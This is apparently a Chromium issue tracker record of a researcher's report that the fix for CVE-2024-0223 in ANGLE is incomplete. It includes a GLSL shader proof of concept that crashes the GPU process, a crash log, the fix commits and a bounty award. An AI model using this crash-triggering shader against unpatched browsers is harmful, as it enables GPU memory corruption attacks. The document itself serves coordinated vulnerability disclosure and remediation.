# Incomplete fix for CVE-2024-0223

| Field | Value |
|-------|-------|
| **Issue ID** | [328859176](https://issues.chromium.org/issues/328859176) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>GPU>ANGLE, Internals>GPU>SwiftShader |
| **Platforms** | Linux, Mac, Windows |
| **CVE IDs** | CVE-2024-0223 |
| **Reporter** | d8...@gmail.com |
| **Assignee** | sy...@chromium.org |
| **Created** | 2024-03-09 |
| **Bounty** | $10,000.00 |

## Description

Hi,
Im reporting incomplete fix for CVE-2024-0223 (https://issues.chromium.org/u/1/issues/40945594)
I can bypass the fix with `sampler2D` structure and trigger the assert again.

```
version 300 es
        precision highp float;

          struct X {
              mediump sampler2D a[0xf00]; 
              mediump sampler2D b[0xf00]; 
              mediump sampler2D c[0xf000];
              mediump sampler2D d[0xf00]; 
          };


        struct Sinner {
          X s1;
          mediump sampler2D a[0xf00]; 
          mediump sampler2D b[0xf000];
          mediump sampler2D c[0x14000];
        };

        struct S {
            Sinner s1;
        };


        layout(std140) uniform structBuffer { S s; } buffer;

        void acs(S s)
        {
            
        }

        void main()
        {
            acs(buffer.s);
        }
```
```
WARN: BuildSPIRV.cpp:1088 (declareType):        ! Assert failed in declareType (../../src/compiler/translator/spirv/BuildSPIRV.cpp:1088): !IsOpaqueType(type.type)             
Warning: spirv_instruction_builder_autogen.cpp:25 (MakeLengthOp):       ! Assert failed in MakeLengthOp (../../src/common/spirv/spirv_instruction_builder_autogen.cpp:25): length <= 0xFFFFu
```

VERSION
Chrome Version: All version + Channels
Operating System: All OS

REPRODUCTION:
run chrome asan build official with poc will see crash log at below, basically it same with my previous report but i haven't modify so it can crash in ASAN, kindly let me know if you guys need one.
 
./chrome -use-gl=angle -use-angle=swiftshader http://localhost:8000/poc2.html

```
DISPLAY=:0 ./chrome http://localhost:8000/poc2.html             
[205661:205661:0310/001031.856269:ERROR:policy_logger.cc(157)] :components/enterprise/browser/controller/chrome_browser_cloud_management_controller.cc(161) Cloud management controller initialization aborted as CBCM is not en
abled. Please use the `--enable-chrome-browser-cloud-management` command line flag to enable it if you are not using the official Google Chrome build.
[205701:205701:0310/001032.089474:ERROR:viz_main_impl.cc(198)] Exiting GPU process due to errors during initialization
[205661:205661:0310/001033.514961:ERROR:object_proxy.cc(576)] Failed to call method: org.freedesktop.ScreenSaver.GetActive: object_path= /org/freedesktop/ScreenSaver: org.freedesktop.DBus.Error.NotSupported: This method is n
ot implemented      
[205833:205833:0310/001033.661582:ERROR:viz_main_impl.cc(198)] Exiting GPU process due to errors during initialization
[205909:205909:0310/001033.885618:ERROR:viz_main_impl.cc(198)] Exiting GPU process due to errors during initialization
[205806:7:0310/001034.071995:ERROR:command_buffer_proxy_impl.cc(131)] ContextResult::kTransientFailure: Failed to send GpuControl.CreateCommandBuffer.                                                             
[205981:205981:0310/001034.628574:ERROR:gl_utils.cc(424)] [.WebGL-0x51b000009a80]GL Driver Message (OpenGL, Performance, GL_CLOSE_PATH_NV, High): GPU stall due to ReadPixels                                  
^Cp@sss:/util/pocpoc/124$ DISPLAY=:0 ./chrome -use-gl=angle -use-angle=swiftshader http://localhost:8000/poc2.html
[206052:206052:0310/001116.169569:ERROR:policy_logger.cc(157)] :components/enterprise/browser/controller/chrome_browser_cloud_management_controller.cc(161) Cloud management controller initialization aborted as CBCM is not en
abled. Please use the `--enable-chrome-browser-cloud-management` command line flag to enable it if you are not using the official Google Chrome build.
[206052:206052:0310/001117.827336:ERROR:object_proxy.cc(576)] Failed to call method: org.freedesktop.ScreenSaver.GetActive: object_path= /org/freedesktop/ScreenSaver: org.freedesktop.DBus.Error.NotSupported: This method is n
ot implemented
^Cp@sss:/util/pocpoc/124$ DISPLAY=:0 ./chrome -use-gl=angle -use-angle=swiftshader http://localhost:8000/poc2.html
[206272:206272:0310/001200.326222:ERROR:policy_logger.cc(157)] :components/enterprise/browser/controller/chrome_browser_cloud_management_controller.cc(161) Cloud management controller initialization aborted as CBCM is not en
abled. Please use the `--enable-chrome-browser-cloud-management` command line flag to enable it if you are not using the official Google Chrome build.
[206272:206272:0310/001201.996816:ERROR:object_proxy.cc(576)] Failed to call method: org.freedesktop.ScreenSaver.GetActive: object_path= /org/freedesktop/ScreenSaver: org.freedesktop.DBus.Error.NotSupported: This method is n
ot implemented
[206312:206312:0310/001202.430149:ERROR:gl_utils.cc(420)] [.WebGL-0x51b00000a880] GL_INVALID_OPERATION: It is undefined behaviour to have a used but unbound uniform buffer.
SPIR-V ERROR: 0:0 Invalid opcode: 23713
SPIR-V WARNING: 0:0 Invalid opcode: 23713
[0310/001203.111857:ERROR:file_io_posix.cc(145)] open /sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq: No such file or directory (2)
[0310/001203.112008:ERROR:file_io_posix.cc(145)] open /sys/devices/system/cpu/cpu0/cpufreq/scaling_max_freq: No such file or directory (2)
Received signal 11 SEGV_MAPERR 000000000014
#0 0x556a7fa55506 (/util/pocpoc/124/chrome+0xe560505)
#1 0x556a916c7338 (/util/pocpoc/124/chrome+0x201d2337)
#2 0x556a9168ff19 (/util/pocpoc/124/chrome+0x2019af18)
#3 0x556a916c6626 (/util/pocpoc/124/chrome+0x201d1625)
#4 0x7f455ce42520 (/usr/lib/x86_64-linux-gnu/libc.so.6+0x4251f)
#5 0x7f454928de65 <unknown>
#6 0x7f454929d393 <unknown>
#7 0x7f45490afda6 <unknown>
#8 0x7f45490aa9de <unknown>
#9 0x7f45490d6a87 <unknown>
#10 0x7f45549e8d51 <unknown>
#11 0x7f45549ea675 <unknown>
#12 0x7f4554890f46 <unknown>
#13 0x7f45548905a7 <unknown>
#14 0x7f45551f625b <unknown>
#15 0x556a9573f75b (/util/pocpoc/124/chrome+0x2424a75a)
#16 0x556a9573faa0 (/util/pocpoc/124/chrome+0x2424aa9f)
#17 0x556a91542845 (/util/pocpoc/124/chrome+0x2004d844)
#18 0x556a915c73ac (/util/pocpoc/124/chrome+0x200d23ab)
#19 0x556a915c75fd (/util/pocpoc/124/chrome+0x200d25fc)
```

CREDIT INFORMATION

Reporter credit: Bao (zx) Pham and Toan (suto) Pham of Qrious Secure

## Attachments

- [poc2.html](attachments/poc2.html) (text/html, 2.0 KB)

## Timeline

### cl...@appspot.gserviceaccount.com (2024-03-11)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5096271689220096.

### cl...@appspot.gserviceaccount.com (2024-03-11)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4916703279906816.

### 24...@project.gserviceaccount.com (2024-03-11)

Testcase 5096271689220096 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=5096271689220096.

### ma...@chromium.org (2024-03-11)

Thanks for the report! I was able to reproduce this with chromium-122.0.6261.112-mac-asan and chromium-124.0.6351.0-mac-asan, but was not able to convince ClusterFuzz to reproduce it.

Assigning and setting severity based on original bug <https://crbug.com/40945594>.

### pe...@google.com (2024-03-12)

Setting milestone because of s0/s1 severity.

### pe...@google.com (2024-03-12)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### sy...@chromium.org (2024-03-25)

This shader is actually not correct. GLES3 does not allow structs in an interface block:

> Types and declarators are the same as for other uniform variable declarations outside blocks, with these exceptions:
> 
> • opaque types are not allowed

However, I can still reproduce a similar problem with:

```
-layout(std140) uniform structBuffer { S s; } buffer;
+uniform structBuffer { S s; } b;

```

### sy...@chromium.org (2024-03-25)

Well my bad, the second line is still an interface block. Changing that to:

```
struct structBuffer { S s; };
uniform structBuffer b;

```

works and there are no assertion failures.

### ap...@google.com (2024-03-28)

Project: angle/angle
Branch: main

commit a0fa06f6d79ced897c0fe2795551268199d29806
Author: Shahbaz Youssefi <syoussefi@chromium.org>
Date:   Mon Mar 25 14:46:56 2024

    Translator: Disallow samplers in structs in interface blocks
    
    As disallowed by the spec:
    
    > Types and declarators are the same as for other uniform variable
    > declarations outside blocks, with these exceptions:
    >
    > * opaque types are not allowed
    
    Bug: chromium:328859176
    Change-Id: Ib94977860102329e520e635c3757827c93ca2163
    Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/5391986
    Auto-Submit: Shahbaz Youssefi <syoussefi@chromium.org>
    Reviewed-by: Geoff Lang <geofflang@chromium.org>
    Commit-Queue: Shahbaz Youssefi <syoussefi@chromium.org>

M       src/compiler/translator/ParseContext.cpp
M       src/tests/gl_tests/GLSLTest.cpp
M       src/tests/gl_tests/PixelLocalStorageTest.cpp

https://chromium-review.googlesource.com/5391986


### ap...@google.com (2024-03-29)

Project: chromium/src
Branch: main

commit e89ea273f3d1a5f527cc893bcd3c35ad8f733304
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date:   Fri Mar 29 02:23:26 2024

    Roll ANGLE from b4cf07c365c8 to 2b66694d37de (6 revisions)
    
    https://chromium.googlesource.com/angle/angle.git/+log/b4cf07c365c8..2b66694d37de
    
    2024-03-28 lexa.knyazev@gmail.com Metal: Untangle public draw calls
    2024-03-28 yuxinhu@google.com Remove test suppression of dEQP-EGL*robustness on Pixel 6
    2024-03-28 syoussefi@chromium.org Vulkan: Allow depth and stencil resolve to be separately added
    2024-03-28 syoussefi@chromium.org Add a few use-after-resolve depth/stencil framebuffer tests
    2024-03-28 syoussefi@chromium.org Translator: Disallow samplers in structs in interface blocks
    2024-03-28 angle-autoroll@skia-public.iam.gserviceaccount.com Manual roll SwiftShader from 0bacc751b4d1 to 6912e7d5b75a (2 revisions)
    
    If this roll has caused a breakage, revert this CL and stop the roller
    using the controls here:
    https://autoroll.skia.org/r/angle-chromium-autoroll
    Please CC angle-team@google.com,solti@google.com on the revert to ensure that a human
    is aware of the problem.
    
    To file a bug in ANGLE: https://bugs.chromium.org/p/angleproject/issues/entry
    To file a bug in Chromium: https://bugs.chromium.org/p/chromium/issues/entry
    
    To report a problem with the AutoRoller itself, please file a bug:
    https://issues.skia.org/issues/new?component=1389291&template=1850622
    
    Documentation for the AutoRoller is here:
    https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md
    
    Cq-Include-Trybots: luci.chromium.try:android_optional_gpu_tests_rel;luci.chromium.try:linux_optional_gpu_tests_rel;luci.chromium.try:mac_optional_gpu_tests_rel;luci.chromium.try:win_optional_gpu_tests_rel;luci.chromium.try:linux-swangle-try-x64;luci.chromium.try:win-swangle-try-x86
    Bug: chromium:328859176
    Tbr: solti@google.com
    Change-Id: I4100de576e482d52d27c3adea619c5add294c554
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5405510
    Bot-Commit: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
    Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
    Cr-Commit-Position: refs/heads/main@{#1280042}

M       DEPS
M       third_party/angle

https://chromium-review.googlesource.com/5405510


### pe...@google.com (2024-03-29)

Requesting merge to extended stable (M122) because latest trunk commit (1280042) appears to be after extended stable branch point (1250580).
Requesting merge to stable (M123) because latest trunk commit (1280042) appears to be after stable branch point (1262506).
Requesting merge to beta (M124) because latest trunk commit (1280042) appears to be after beta branch point (1274542).
Merge review required: a commit with DEPS changes was detected.


Merge review required: a commit with DEPS changes was detected.


Merge review required: a commit with DEPS changes was detected.


Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [122, 123, 124].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


### sy...@chromium.org (2024-04-02)

1. <https://chromium-review.googlesource.com/c/angle/angle/+/5391986>
2. Haven't gotten any report of instability
3. No
4. No
5. No

### am...@chromium.org (2024-04-03)

merge approved for <https://crrev.com/c/5391986> -- please merge this fix to M124 Beta / branch 6367 and M123 Stable / branch 6312 by EOD tomorrow / Thursday so this fix can be included in the next M123 Stable update and the impending M124 Stable Cut -- thank you!

### am...@google.com (2024-04-04)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2024-04-04)

Congratulations zx and suto! The Chrome VRP Panel has decided to award you $10,000 for this report of GPU process memory corruption. Thank you for your efforts in discovering and reporting this issue to us -- nice work!

### pe...@google.com (2024-04-08)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### ap...@google.com (2024-04-08)

Project: angle/angle
Branch: chromium/6367

commit a38ec7f1cdd66affac79115facb8e112a72c3e0d
Author: Shahbaz Youssefi <syoussefi@chromium.org>
Date:   Mon Mar 25 14:46:56 2024

    M124: Translator: Disallow samplers in structs in interface blocks
    
    As disallowed by the spec:
    
    > Types and declarators are the same as for other uniform variable
    > declarations outside blocks, with these exceptions:
    >
    > * opaque types are not allowed
    
    Bug: chromium:328859176
    Change-Id: Ib94977860102329e520e635c3757827c93ca2163
    Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/5391986
    Auto-Submit: Shahbaz Youssefi <syoussefi@chromium.org>
    Reviewed-by: Geoff Lang <geofflang@chromium.org>
    Commit-Queue: Shahbaz Youssefi <syoussefi@chromium.org>
    (cherry picked from commit a0fa06f6d79ced897c0fe2795551268199d29806)
    Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/5435714
    Reviewed-by: Yuly Novikov <ynovikov@chromium.org>

M       src/compiler/translator/ParseContext.cpp
M       src/tests/gl_tests/GLSLTest.cpp
M       src/tests/gl_tests/PixelLocalStorageTest.cpp

https://chromium-review.googlesource.com/5435714


### ap...@google.com (2024-04-08)

Project: angle/angle
Branch: chromium/6312

commit f6672dbbe223e68396d6dfab11edc342aa435719
Author: Shahbaz Youssefi <syoussefi@chromium.org>
Date:   Mon Mar 25 14:46:56 2024

    M123: Translator: Disallow samplers in structs in interface blocks
    
    As disallowed by the spec:
    
    > Types and declarators are the same as for other uniform variable
    > declarations outside blocks, with these exceptions:
    >
    > * opaque types are not allowed
    
    Bug: chromium:328859176
    Change-Id: Ib94977860102329e520e635c3757827c93ca2163
    Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/5391986
    Auto-Submit: Shahbaz Youssefi <syoussefi@chromium.org>
    Reviewed-by: Geoff Lang <geofflang@chromium.org>
    Commit-Queue: Shahbaz Youssefi <syoussefi@chromium.org>
    (cherry picked from commit a0fa06f6d79ced897c0fe2795551268199d29806)
    Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/5435737
    Reviewed-by: Yuly Novikov <ynovikov@chromium.org>

M       src/compiler/translator/ParseContext.cpp
M       src/tests/gl_tests/GLSLTest.cpp
M       src/tests/gl_tests/PixelLocalStorageTest.cpp

https://chromium-review.googlesource.com/5435737


### ap...@google.com (2024-04-08)

Project: angle/angle
Branch: chromium/6367

commit a38ec7f1cdd66affac79115facb8e112a72c3e0d
Author: Shahbaz Youssefi <syoussefi@chromium.org>
Date:   Mon Mar 25 14:46:56 2024

    M124: Translator: Disallow samplers in structs in interface blocks
    
    As disallowed by the spec:
    
    > Types and declarators are the same as for other uniform variable
    > declarations outside blocks, with these exceptions:
    >
    > * opaque types are not allowed
    
    Bug: chromium:328859176
    Change-Id: Ib94977860102329e520e635c3757827c93ca2163
    Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/5391986
    Auto-Submit: Shahbaz Youssefi <syoussefi@chromium.org>
    Reviewed-by: Geoff Lang <geofflang@chromium.org>
    Commit-Queue: Shahbaz Youssefi <syoussefi@chromium.org>
    (cherry picked from commit a0fa06f6d79ced897c0fe2795551268199d29806)
    Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/5435714
    Reviewed-by: Yuly Novikov <ynovikov@chromium.org>

M       src/compiler/translator/ParseContext.cpp
M       src/tests/gl_tests/GLSLTest.cpp
M       src/tests/gl_tests/PixelLocalStorageTest.cpp

https://chromium-review.googlesource.com/5435714


### pe...@google.com (2024-07-05)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/328859176)*
